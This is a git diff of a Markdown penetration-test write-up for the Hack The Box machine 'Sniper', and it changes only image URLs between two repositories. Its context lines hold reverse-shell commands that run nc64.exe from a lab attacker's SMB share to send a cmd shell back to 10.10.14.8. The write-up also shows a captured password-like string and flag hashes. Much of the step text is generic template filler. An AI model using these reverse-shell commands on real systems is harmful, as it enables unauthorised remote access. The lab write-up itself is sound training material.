@@ -4,7 +4,7 @@ published: true
 description: "Comprehensive offensive security assessment and penetration testing report for Sniper (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
 tags: cybersecurity, hackthebox, pentesting, infosec
 series: "HackTheBox Enterprise Assessments"
-cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_01.png"
+cover_image: "https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_01.png"
 ---
 
 # Offensive Security Assessment Report: Sniper
@@ -78,7 +78,7 @@ cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/mai
 * **Observed Evidence / Output:** 4
 
 
-![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_01.png)
+![step_01.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_01.png)
 * **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.
 
 
@@ -88,17 +88,17 @@ cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/mai
 * **Observed Evidence / Output:** lang
 
 
-![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_02.png)
+![step_02.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_02.png)
 * **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.
 
 
 
-![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_03.png)
+![step_03.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_03.png)
 * **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_04.png)
+![step_04.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_04.png)
 * **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -108,27 +108,27 @@ cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/mai
 * **Observed Evidence / Output:** C:\windows\temp\sess_923nktm0vmmi12qrptls332t5o
 
 
-![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_05.png)
+![step_05.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_05.png)
 * **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_06.png)
+![step_06.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_06.png)
 * **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_07.png)
+![step_07.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_07.png)
 * **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_08.png)
+![step_08.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_08.png)
 * **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_09.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_09.png)
+![step_09.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_09.png)
 * **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -139,7 +139,7 @@ printf 'cmd /c "\\10.10.14.8\share\nc64.exe -e cmd.exe 10.10.14.8 443"' \
 ```
 
 
-![step_10.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_10.png)
+![step_10.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_10.png)
 * **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -148,7 +148,7 @@ printf 'cmd /c "\\10.10.14.8\share\nc64.exe -e cmd.exe 10.10.14.8 443"' \
 * **Observed Evidence / Output:** no
 
 
-![step_11.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_11.png)
+![step_11.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_11.png)
 * **Assessment Step 11:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -158,7 +158,7 @@ printf 'cmd /c "\\10.10.14.8\share\nc64.exe -e cmd.exe 10.10.14.8 443"' \
 * **Observed Evidence / Output:** C:\inetpub\wwwroot\blog
 
 
-![step_12.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_12.png)
+![step_12.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_12.png)
 * **Assessment Step 12:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -168,7 +168,7 @@ printf 'cmd /c "\\10.10.14.8\share\nc64.exe -e cmd.exe 10.10.14.8 443"' \
 * **Observed Evidence / Output:** 36mEAhz/B8xQ~2VM
 
 
-![step_13.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_13.png)
+![step_13.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_13.png)
 * **Assessment Step 13:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -199,22 +199,22 @@ Invoke-Command -ScriptBlock { \\10.10.14.8\share\nc64.exe -e cmd 10.10.14.8 9001
 * **Observed Evidence / Output:** c2d3083534c336df8467dd0502d4db46
 
 
-![step_14.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_14.png)
+![step_14.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_14.png)
 * **Assessment Step 14:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_15.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_15.png)
+![step_15.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_15.png)
 * **Assessment Step 15:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_16.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_16.png)
+![step_16.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_16.png)
 * **Assessment Step 16:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_17.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_17.png)
+![step_17.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_17.png)
 * **Assessment Step 17:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -223,7 +223,7 @@ Invoke-Command -ScriptBlock { \\10.10.14.8\share\nc64.exe -e cmd 10.10.14.8 9001
 * **Observed Evidence / Output:** C:\Docs
 
 
-![step_18.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_18.png)
+![step_18.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_18.png)
 * **Assessment Step 18:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -233,7 +233,7 @@ Invoke-Command -ScriptBlock { \\10.10.14.8\share\nc64.exe -e cmd 10.10.14.8 9001
 * **Observed Evidence / Output:** chm
 
 
-![step_19.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_19.png)
+![step_19.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_19.png)
 * **Assessment Step 19:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -243,7 +243,7 @@ Invoke-Command -ScriptBlock { \\10.10.14.8\share\nc64.exe -e cmd 10.10.14.8 9001
 * **Observed Evidence / Output:** administrator
 
 
-![step_20.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_20.png)
+![step_20.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_20.png)
 * **Assessment Step 20:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -252,17 +252,17 @@ Invoke-Command -ScriptBlock { \\10.10.14.8\share\nc64.exe -e cmd 10.10.14.8 9001
 * **Observed Evidence / Output:** 4f5f23a81880d4bbba2bd57c53eb8423
 
 
-![step_21.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_21.png)
+![step_21.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_21.png)
 * **Assessment Step 21:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_22.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_22.png)
+![step_22.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_22.png)
 * **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.
 
 
 
-![step_23.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/sniper/images/step_23.png)
+![step_23.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/sniper/images/step_23.png)
 * **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.
 
 ---
